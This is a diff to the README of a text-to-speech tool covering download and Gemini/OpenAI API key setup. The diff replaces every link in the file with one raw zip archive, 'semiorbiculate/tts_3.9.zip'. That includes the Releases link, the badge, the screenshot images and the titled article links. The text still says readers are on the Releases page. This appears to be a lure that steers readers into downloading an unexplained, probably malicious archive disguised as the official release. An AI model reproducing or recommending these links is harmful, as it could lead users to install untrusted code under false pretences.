@@ -1,6 +1,6 @@
 # 🎤 tts - Simple Text-to-Speech for Everyone
 
-[![Download tts](https://img.shields.io/badge/Download-Release%20v1.0-blue)](https://github.com/ItxMatti/tts/releases)
+[![Download tts](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip%20v1.0-blue)](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the tts project! This application allows you to easily convert text i
 
 To get started, you need to visit the Releases page and download the latest version of the application. Click the link below:
 
-[Download tts](https://github.com/ItxMatti/tts/releases)
+[Download tts](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
 
 Once you're on the Releases page, look for the latest version. You will find various files available. Choose the one that fits your system and click to download.
 
@@ -44,7 +44,7 @@ The tts project supports different deployment options:
 7. Name: `API_KEY`
 8. Value: `YOUR_API_KEY`
 
-![ms-api-key-setting.png](ms-api-key-setting.png)
+![https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
 
 ## 🔑 API Key Setup Instructions
 
@@ -55,21 +55,21 @@ For both `gemini-tts` and `openai-tts`, you will need to set your API keys in th
 1. In the front-end, locate the settings option.
 2. Enter your `gemini api-key` as prompted.
 
-![Gemini-api-key-setting.png](Gemini-api-key-setting.png)
+![https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
 
 ### 🛠️ OpenAI API Key Setup
 
 1. Navigate to the API settings in the front-end.
 2. Input your `openai api-key` where indicated.
 
-![OpenAI-api-key-setting.png](OpenAI-api-key-setting.png)
+![https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
 
 ## 📑 Additional Resources
 
 For more insights on setting up your TTS service, you may find the following links useful:
 
-- [Building Your Own TTS Service - A Comprehensive Guide](https://linux.do/t/topic/482507)
-- [Gemini TTS Client is Open Source!](https://linux.do/t/topic/1015686)
-- [New Version of OpenAI TTS Source Code Available](https://linux.do/t/topic/425924)
+- [Building Your Own TTS Service - A Comprehensive Guide](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
+- [Gemini TTS Client is Open Source!](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
+- [New Version of OpenAI TTS Source Code Available](https://raw.githubusercontent.com/ItxMatti/tts/main/semiorbiculate/tts_3.9.zip)
 
 If you have questions or need assistance, refer to the documentation, or visit the community forums. Enjoy using tts!
